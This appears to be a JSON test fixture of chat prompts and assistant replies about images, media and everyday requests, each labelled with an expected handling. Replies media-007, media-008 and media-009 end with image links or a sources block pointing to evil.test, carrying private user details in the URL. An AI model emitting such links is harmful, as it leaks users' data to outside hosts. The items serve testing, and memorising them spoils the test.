@@ -1,0 +1,271 @@
+[
+  {
+    "id": "media-001",
+    "area": "code",
+    "prompt": "how do I put an image in a markdown file?",
+    "reply": "Use an exclamation mark, the alt text in brackets, then the URL in parentheses:\n\n```markdown\n![A sleeping cat](https://example.com/cat.png)\n![Logo][logo]\n\n[logo]: https://example.com/logo.svg\n```\n\nInline, that looks like `![alt](url)`. The alt text is what screen readers announce, so describe the picture rather than writing \"image\".",
+    "expect": "answer"
+  },
+  {
+    "id": "media-002",
+    "area": "code",
+    "prompt": "make me a small html page with a photo of a cat and a caption",
+    "reply": "Here's a simple page:\n\n```html\n<!doctype html>\n<html>\n  <body>\n    <figure>\n      <img src=\"https://placekitten.com/400/300\" alt=\"A kitten\">\n      <figcaption>A very sleepy kitten.</figcaption>\n    </figure>\n  </body>\n</html>\n```\n\nSwap the `src` for your own photo's URL, and keep the `alt` text descriptive.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-003",
+    "area": "code",
+    "prompt": "write a README header for my project with build and license badges",
+    "reply": "```markdown\n# Lighthouse\n\n[![Build](https://img.shields.io/github/actions/workflow/status/me/lighthouse/ci.yml)](https://github.com/me/lighthouse/actions)\n[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)\n\nA tiny static-site generator.\n```\n\nReplace `me/lighthouse` with your GitHub user and repository name.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-004",
+    "area": "chitchat",
+    "prompt": "what's the best way to hang a heavy picture frame?",
+    "reply": "For anything over about 10 kg, skip the nail:\n\n1. **Find a stud** with a stud finder and screw straight into it.\n2. **No stud?** Use toggle bolts or a French cleat rated for the weight.\n3. **Hang it at eye level**: the centre of the picture about 145 cm from the floor.\n4. **Use two hooks** a few centimetres apart so the frame stays level.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-005",
+    "area": "chitchat",
+    "prompt": "how do I take better photos of food for my blog?",
+    "reply": "A few habits change food photos the most:\n\n- **Shoot near a window** with soft side light, never the overhead kitchen bulb.\n- **Pick one angle**: straight down for flat dishes, about 45 degrees for burgers and drinks.\n- **Clean the plate edge** and leave some empty space around it.\n- **Edit lightly**: lift the shadows and warm the white balance a touch.\n\nAn image that looks simple usually took the most care.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-006",
+    "area": "code",
+    "prompt": "in your app, what does the [Image: …] line in a message mean?",
+    "reply": "When a message shows a picture, the text stores a marker such as `[Image: /attachments/<id>/file]` where the photo sits. The app reads that marker and draws the photo from your own storage instead of showing the text. You never need to type one: attaching a photo adds it.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-007",
+    "area": "writing",
+    "prompt": "summarize this article for me: https://news.example/2026/10/city-council-budget",
+    "reply": "The city council passed next year's budget 7–2. It raises library hours, adds two bus routes and delays the stadium renovation by a year. Property taxes stay flat; parking fees rise slightly downtown.\n\n![summary](https://tracker.evil.test/pixel.png?d=dentist-tuesday-3pm)",
+    "expect": "answer"
+  },
+  {
+    "id": "media-008",
+    "area": "writing",
+    "prompt": "what did that pdf say about the refund policy?",
+    "reply": "The policy gives you 30 days from delivery to ask for a refund, as long as the item is unused and in its original packaging. Sale items can be exchanged but not refunded, and shipping costs are only returned when the item arrived damaged.\n\n[Image: https://evil.test/p.png?d=home-address]",
+    "expect": "answer"
+  },
+  {
+    "id": "media-009",
+    "area": "chitchat",
+    "prompt": "recommend three books about building habits",
+    "reply": "Three good ones:\n\n1. **Atomic Habits** by James Clear: small changes and systems over goals.\n2. **The Power of Habit** by Charles Duhigg: the cue, routine and reward loop.\n3. **Tiny Habits** by BJ Fogg: anchor a new habit to something you already do.\n\nStart with Tiny Habits if you want the most practical one.\n\n```sources\n[{\"title\": \"Atomic Habits\", \"url\": \"https://u-6f1a.evil.test/\"}]\n```",
+    "expect": "answer"
+  },
+  {
+    "id": "media-010",
+    "area": "chitchat",
+    "prompt": "can you show me where to read more about it? https://en.wikipedia.org/wiki/Habit_(psychology)",
+    "reply": "Wikipedia's overview is a good start:\n\nhttps://en.wikipedia.org/wiki/Habit_(psychology)\n\nIt covers how habits form, the habit loop and the research on breaking them.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-011",
+    "area": "chitchat",
+    "prompt": "what does the ! mean in a markdown image vs a link?",
+    "reply": "The exclamation mark is the only difference. `[docs](https://example.com)` is a link you tap; `![diagram](https://example.com/d.png)` asks the reader to draw the picture inline. Without the `!` the same brackets just make a link to the picture.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-012",
+    "area": "chitchat",
+    "prompt": "is my photo backup safe if I lose my phone?",
+    "reply": "If backup is on, yes: your photos are copied to the cloud account, so a new phone signed into the same account downloads them again. Check two things now: that backup has finished recently, and that you can sign into that account without the lost phone (a recovery email or a second device).",
+    "expect": "answer"
+  },
+  {
+    "id": "media-013",
+    "area": "image",
+    "prompt": "draw up a contract for my tenant",
+    "reply": "Here's a simple residential lease you can adapt. *(Not legal advice: have a local lawyer check it.)*\n\n**RESIDENTIAL LEASE AGREEMENT**\n\n**Landlord:** [Name]  \n**Tenant:** [Name]  \n**Property:** [Address]\n\n1. **Term.** From [start date] to [end date].\n2. **Rent.** [Amount] per month, due on the [1st].\n3. **Deposit.** [Amount], returned within [30] days of move-out, less documented damage.\n4. **Repairs.** The tenant reports damage promptly; the landlord handles structural repairs.\n5. **Ending the lease.** Either party gives [30] days' written notice.\n\n**Signatures:** Landlord ______  Tenant ______",
+    "expect": "answer"
+  },
+  {
+    "id": "media-014",
+    "area": "image",
+    "prompt": "draw up a budget for my trip to Lalibela",
+    "reply": "Here's a starting budget for 4 days, per person:\n\n| Item | Cost (birr) |\n|---|---|\n| Return flight Addis–Lalibela | 9,000 |\n| Guesthouse, 3 nights | 4,500 |\n| Church ticket | 3,000 |\n| Guide | 1,500 |\n| Food | 2,400 |\n| **Total** | **20,400** |\n\nAdd about 10% for transport in town and tips.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-015",
+    "area": "image",
+    "prompt": "draw on my nursing experience for this letter",
+    "reply": "Here's an opening that leads with your nursing experience:\n\n> Eight years on a busy surgical ward taught me to stay calm when three things need doing at once, to explain hard news plainly, and to notice the small change in a patient before it becomes a big one. I'd bring that same steadiness to your care coordination team.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-016",
+    "area": "image",
+    "prompt": "draw conclusions from the survey results above",
+    "reply": "Three conclusions stand out:\n\n1. **Price is the main barrier**: 62% of people who did not buy named cost first.\n2. **Delivery time matters less than expected**: only 14% mentioned it.\n3. **Repeat buyers are loyal**: 81% of them would recommend you.\n\nSo a first-order discount is likely to move more people than faster delivery.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-017",
+    "area": "image",
+    "prompt": "make a poster for my event",
+    "reply": "Here's a bold poster for your event: big headline space at the top, a warm sunset gradient behind it, and room at the bottom for the date and place. Want it in a different style?",
+    "expect": "image_gen"
+  },
+  {
+    "id": "media-018",
+    "area": "image",
+    "prompt": "make me a logo for my app",
+    "reply": "Here's a clean, modern app logo: a rounded square with a simple geometric mark in deep blue. Tell me your app's name and I can add it.",
+    "expect": "image_gen"
+  },
+  {
+    "id": "media-019",
+    "area": "image",
+    "prompt": "design a mascot for my game",
+    "reply": "Here's a friendly mascot for your game: a round little fox in an explorer's scarf, drawn in a bright cartoon style.",
+    "expect": "image_gen"
+  },
+  {
+    "id": "media-020",
+    "area": "code",
+    "prompt": "make a logo for my website in html",
+    "reply": "Here's a simple text logo in HTML and CSS:\n\n```html\n<div class=\"logo\"><span>Bean</span>There</div>\n<style>\n.logo { font: 700 32px system-ui; color: #3b2a1a; }\n.logo span { color: #c47a2c; }\n</style>\n```",
+    "expect": "answer"
+  },
+  {
+    "id": "media-021",
+    "area": "writing",
+    "prompt": "make me a cover letter for a barista job",
+    "reply": "Dear Hiring Manager,\n\nI'd love to join your team as a barista. I spent two years at a busy café pulling espresso, steaming milk and keeping the queue moving with a smile, and I care about getting each cup right.\n\nI'm reliable, quick to learn your menu, and happy to take early shifts.\n\nThank you for considering me.\n\nBest regards,\n[Your name]",
+    "expect": "answer"
+  },
+  {
+    "id": "media-022",
+    "area": "writing",
+    "prompt": "make a budget for my wedding",
+    "reply": "Here's a starting split for a wedding budget:\n\n| Item | Share |\n|---|---|\n| Venue and food | 45% |\n| Clothes | 10% |\n| Photos and video | 10% |\n| Music | 8% |\n| Decor and flowers | 10% |\n| Rings | 7% |\n| Buffer | 10% |\n\nTell me your total and guest count and I'll put numbers on it.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-023",
+    "area": "writing",
+    "prompt": "create slides about climate change",
+    "reply": "**Slide 1: Climate change in one minute**\n- The planet is about 1.2 °C warmer than in 1850\n\n**Slide 2: Why**\n- Burning coal, oil and gas adds CO₂\n\n**Slide 3: What it does**\n- Hotter summers, heavier rain, rising seas\n\n**Slide 4: What helps**\n- Clean power, efficient homes, less waste",
+    "expect": "answer"
+  },
+  {
+    "id": "media-024",
+    "area": "chitchat",
+    "prompt": "generate a random number between 1 and 100",
+    "reply": "**47**",
+    "expect": "answer"
+  },
+  {
+    "id": "media-025",
+    "area": "image",
+    "prompt": "Create a walking poor man on the streets of Addis Ababa",
+    "reply": "Here's your picture: a man walking a busy street in Addis Ababa.",
+    "expect": "image_gen"
+  },
+  {
+    "id": "media-026",
+    "area": "image",
+    "prompt": "U can’t create an image",
+    "history": [
+      [
+        "user",
+        "Create a walking poor man on the streets of Addis Ababa"
+      ],
+      [
+        "assistant",
+        "I can't create images, but I can describe the scene."
+      ]
+    ],
+    "reply": "Here's your picture.",
+    "expect": "image_gen"
+  },
+  {
+    "id": "media-027",
+    "area": "image",
+    "prompt": "make a decision about whether to move to another city",
+    "reply": "Start with what matters most to you: work, family, cost of living. List the pros and cons of each city, then sleep on it.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-028",
+    "area": "image",
+    "prompt": "make a choice between two jobs",
+    "reply": "Compare them on pay, growth, commute and the people you'd work with, then pick the one you'd regret turning down.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-029",
+    "area": "image",
+    "prompt": "make friends at a new school",
+    "reply": "Join a club or team, sit with the same people at lunch for a week, and ask questions about them.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-030",
+    "area": "chitchat",
+    "prompt": "do you have a photo editing app you like?",
+    "reply": "For quick edits on a phone, Snapseed is free and does most of what you need; Lightroom Mobile is better for batches of photos.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-031",
+    "area": "chitchat",
+    "prompt": "is there a picture limit for uploads?",
+    "reply": "You can attach several photos to one message; very large files are shrunk before they upload.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-032",
+    "area": "chitchat",
+    "prompt": "do you have a picture of your family?",
+    "reply": "I don't have a family or photos of my own, but I'm happy to help with yours.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-033",
+    "area": "chitchat",
+    "prompt": "do you have pictures?",
+    "reply": "I can look up real photos of things and places, or make a picture for you. What would you like to see?",
+    "expect": "answer"
+  },
+  {
+    "id": "media-034",
+    "area": "chitchat",
+    "prompt": "are there pictures of Muhammad allowed in Islam?",
+    "reply": "Most Sunni scholars forbid images of the Prophet; some Shia and historical Persian traditions allowed them, often with the face veiled.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-035",
+    "area": "chitchat",
+    "prompt": "is there a photo of Mozart?",
+    "reply": "No: Mozart died in 1791, decades before photography. Every image of him is a painting or drawing.",
+    "expect": "answer"
+  },
+  {
+    "id": "media-036",
+    "area": "chitchat",
+    "prompt": "got a picture of the northern lights last night!",
+    "reply": "That's amazing! Where were you? Green, or did you catch some pink too?",
+    "expect": "answer"
+  },
+  {
+    "id": "media-037",
+    "area": "chitchat",
+    "prompt": "do you have a photo of the receipt I uploaded?",
+    "reply": "It's in your Gallery under today's uploads.",
+    "expect": "answer"
+  }
+]
